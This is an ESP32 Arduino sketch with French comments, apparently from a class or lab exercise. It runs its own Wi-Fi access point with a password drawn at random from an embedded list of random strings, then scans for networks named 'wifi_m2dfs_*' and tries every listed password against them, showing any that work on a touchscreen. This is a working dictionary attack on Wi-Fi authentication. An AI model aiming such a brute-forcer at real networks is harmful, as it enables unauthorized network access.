#include <WiFi.h>
#include "TFT_eSPI.h"
#include "esp_wifi.h"
#include <vector>
#include <cstdlib>
#include <ctime>
#include <map>

// Charger le dictionnaire de mots de passe
std::vector<String> passwords = {
    "kxzvaajn", "nulebozl", "sylmukyv", "fzxhzodw", "mnhfwylw", "xhnvtwdd", "jrulvtsp", "ochdamfa", "plaluafr", "ovnkkilc", "oizuxgas",
    "tjrdbrav", "pklzocye", "vtapalxp", "rtagjdnv", "frvuyeoe", "xghgxava", "rgolvnna", "yfxeqlny", "aewazmzb", "shsiejiu", "iuvmohlb",
    "cjvxdfsl", "qpikserq", "utacmzqp", "ooxevhdn", "sxthtwxj", "llrwdkcx", "ddudifar", "zphrewdm", "mpdkrxev", "updhshlc", "tllzdwkl",
    "riyypzdz", "oemqckth", "tffobpzd", "gtffxvfi", "txjtdwqy", "jfiqxhca", "sgypghxn", "juixjinr", "aowreqdu", "swjeitqz", "igjautba",
    "aiyqeglh", "oswyyore", "xptdcttd", "pcprabke", "kmqzndiw", "dpqzamtm", "dyzcslls", "navqcfvd", "anowzypk", "suahetlj", "yfhccclh",
    "qbmdivqr", "qblucjky", "dguzkxel", "ylpyzgjf", "kbfcdujc", "ctuqkrdr", "ajevmebu", "skmcsqfz", "ffzlwiio", "aftglkvf", "xxdgtzlw",
    "cvlfsunn", "bhdvmvku", "nfqzutau", "ggxbhrho", "qyfalgmh", "tcxkbhrn", "qpogobwf", "cllvemtd", "vthbmclx", "mygnkqqa", "whfrjrlf",
    "gwfeqkgf", "fkvgcrjw", "lezddzaj", "xvczgqaa", "iekrpdyj", "ebkftonw", "eoudylkl", "ebxoxxfm", "janmvljn", "xfudqipe", "yuyfhefw",
    "irxkfjbq", "kwdvygqs", "yvhsdunb", "qhqzskuo", "nkcuqjjx", "treyrebr", "iubgkumg", "iqeblqrp", "awllfhdq", "ywbvnsvp", "eqivzdwz",
    "feskhshm", "fytbaolk", "lnqguosc", "mplxzpwm", "vsedeanw", "rvcnmtqq", "fsptuhkw", "pmjuvole", "fxwnbwxl", "rnkilsjh", "uqpkhdhl",
    "pqzxizwu", "lfgpxewt", "wbsvxglw", "adkfvisy", "moslxmvo", "caiongpk", "mdfldeyy", "fsacirgb", "seosmnio", "zjafdgsg", "xjhbsqbr",
    "emjtockn", "ymajxpiu", "nijknifq", "hbkawhxp", "dxpygtws", "pkkkfsqc", "yfgydefu", "ocnbsmfu", "hqxndvfm", "mpzxmzmc", "ynbxnvcb",
    "yvmmciwz", "nycmnnfk", "foitwmhx", "wslaloll", "obsotlwf", "qcejxtcc", "jytvottv", "yhgoeojj", "nqvxubel", "zekupkif", "iuxizxgu",
    "ksfdaahq", "rfdyxagk", "aodiivkl", "nbomkfft", "gzjubrrt", "xkzfllsy", "zwnghvsp", "lbdnrijp", "tztubmsb", "tmnfepsp", "dvhmvvak",
    "qldcakpn", "gaykchmm", "viulztoy", "rgppnxmt", "gxhxirmi", "nkrhfpvl", "cnuvswpy", "qitnplny", "wrjcumvb", "fmksndas", "cwotawuz",
    "lzkfjavt", "deshqjlv", "hfcrpmqj", "stgtdpmk", "nealxloj", "pqwygeet", "uuvqbkxw", "gyxuyioo", "rqkuzleq", "czuaaire", "pyxcaiqc",
    "exxysayd", "jajnriij", "nchoqudf", "uzexsnfm", "jajuagec", "rnutbptb", "ogvbnogl", "emwuzqan", "kcgzpxfo", "fhgjzrxe", "nrncgdsx",
    "cywwydif", "lyuzcaqv", "iwzzufyn", "qbfjmlfi", "tdnsshfc", "kssrcayx", "ifykxdys", "bazausxn", "wahbnioc", "jvnqahyb", "jngbwrke",
    "nobrqqda", "qjoehftw",

    // Ajoutez ici le reste des mots de passe fournis dans le fichier passwords.txt
};

// Définition du point d'accès
const char *ssid = "wifi_m2dfs_antoine";
String password = "";

// Variables de connexion
int totalConnections = 0;
int totalConnectionsEver = 0;
int totalAttempts = 0;
int currentConnections = 0;
std::vector<String> successfulConnections; // Liste des Wi-Fi connectés

// Initialisation de l'écran TFT
TFT_eSPI tft = TFT_eSPI();
bool onMainScreen = true;
uint16_t x = 0 , y = 0; 

void setup()
{
    Serial.begin(115200);
    srand(esp_random());

    // Sélection d'un mot de passe initial aléatoire
    password = passwords[rand() % passwords.size()];

    // Initialisation du TFT
    tft.init();
    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);

    // Démarrage du Wi-Fi
    WiFi.softAP(ssid, password.c_str());
    Serial.println("Point d'accès WiFi démarré");

    displayMainScreen();
}

void displayMainScreen()
{
    tft.fillScreen(TFT_BLACK);
    tft.drawString("WiFi démarré", 10, 10);
    tft.drawString("MAC ESP: " + WiFi.softAPmacAddress(), 10, 40);
    tft.drawString("Password: " + password, 10, 60);
    tft.drawString("Total connexions: " + String(totalConnections), 10, 90);
    tft.drawString("Total connexions ever: " + String(totalConnectionsEver), 10, 120);
    tft.drawString("Total tentatives: " + String(totalAttempts), 10, 150);
    tft.drawString("Clients actuels: " + String(currentConnections), 10, 180);
}

void scanAndAttemptConnection()
{
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("Scanning WiFi...", 10, 10);

    int n = WiFi.scanNetworks();
    if (n == 0)
    {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.drawString("No WiFi networks found!", 10, 40);
        Serial.println("No WiFi networks found!");
        return;
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    std::vector<String> filteredSSIDs;

    for (int i = 0; i < n; i++)
    {
        String ssid = WiFi.SSID(i);
        if (ssid.startsWith("wifi_m2dfs_")) {
            filteredSSIDs.push_back(ssid);
        }
    }

    if (filteredSSIDs.empty()) {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.drawString("No matching WiFi networks!", 10, 40);
        Serial.println("No matching WiFi networks!");
        return;
    }

    // Afficher les réseaux détectés
    for (size_t i = 0; i < filteredSSIDs.size() && i < 10; i++)
    {
        tft.drawString(String(i + 1) + ": " + filteredSSIDs[i], 10, 40 + (i * 20));
    }

    // Essayer chaque mot de passe sur 3 réseaux à la fois
    while (!passwords.empty()) {
        String randomPassword = passwords[rand() % passwords.size()];
        totalAttempts++;

        Serial.println("Trying password: " + randomPassword);

        for (size_t i = 0; i < filteredSSIDs.size(); i += 3) {
            // Tester sur 3 Wi-Fi à la fois
            for (size_t j = 0; j < 3 && (i + j) < filteredSSIDs.size(); j++) {
                String ssid = filteredSSIDs[i + j];

                Serial.println("Trying to connect to: " + ssid + " with password: " + randomPassword);

                if (WiFi.status() == WL_CONNECTED) {
                    WiFi.disconnect();
                    delay(100);
                }

                WiFi.begin(ssid.c_str(), randomPassword.c_str());

                int attempts = 5;
                while (WiFi.status() != WL_CONNECTED && attempts > 0)
                {
                    delay(1000);
                    attempts--;
                }

                if (WiFi.status() == WL_CONNECTED)
                {
                    Serial.println("Connected to: " + ssid + " with password: " + randomPassword);

                    // Ajouter le SSID à la liste des connexions réussies
                    if (std::find(successfulConnections.begin(), successfulConnections.end(), ssid) == successfulConnections.end()) {
                        successfulConnections.push_back(ssid);
                    }

                    tft.fillScreen(TFT_BLACK);
                    tft.setTextColor(TFT_GREEN, TFT_BLACK);
                    tft.drawString("Connected to:", 10, 10);
                    tft.drawString(ssid, 10, 40);
                    tft.drawString("Password:", 10, 70);
                    tft.drawString(randomPassword, 10, 100);
                    
                    delay(2000);
                    WiFi.disconnect();
                }
            }
        }

        // Retirer ce mot de passe et essayer un autre
        passwords.erase(std::remove(passwords.begin(), passwords.end(), randomPassword), passwords.end());
    }

    WiFi.scanDelete();

    // Affichage des connexions réussies
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("Successful connections:", 10, 220);

    int yPos = 240;
    for (size_t i = 0; i < successfulConnections.size() && i < 5; i++) {
        tft.drawString(successfulConnections[i], 10, yPos);
        yPos += 20;
    }
}

void loop()
{
    static unsigned long lastUpdate = 0;
    if (millis() - lastUpdate > 3000) {
        lastUpdate = millis();
        totalConnections = WiFi.softAPgetStationNum();
        currentConnections = totalConnections;
        if (totalConnections > totalConnectionsEver) {
            totalConnectionsEver = totalConnections;
        }

        tft.fillRect(10, 90, 220, 20, TFT_BLACK);
        tft.drawString("Total connexions: " + String(totalConnections), 10, 90);
        tft.fillRect(10, 120, 220, 20, TFT_BLACK);
        tft.drawString("Total connexions ever: " + String(totalConnectionsEver), 10, 120);
        tft.fillRect(10, 150, 220, 20, TFT_BLACK);
        tft.drawString("Total tentatives: " + String(totalAttempts), 10, 150);
        tft.fillRect(10, 180, 220, 20, TFT_BLACK);
        tft.drawString("Clients actuels: " + String(currentConnections), 10, 180);
    }

    if (tft.getTouch(&x, &y))
    {
        if (onMainScreen)
        {
            onMainScreen = false;
            scanAndAttemptConnection();
        }
        else
        {
            onMainScreen = true;
            displayMainScreen();
        }
        delay(300);
    }
}
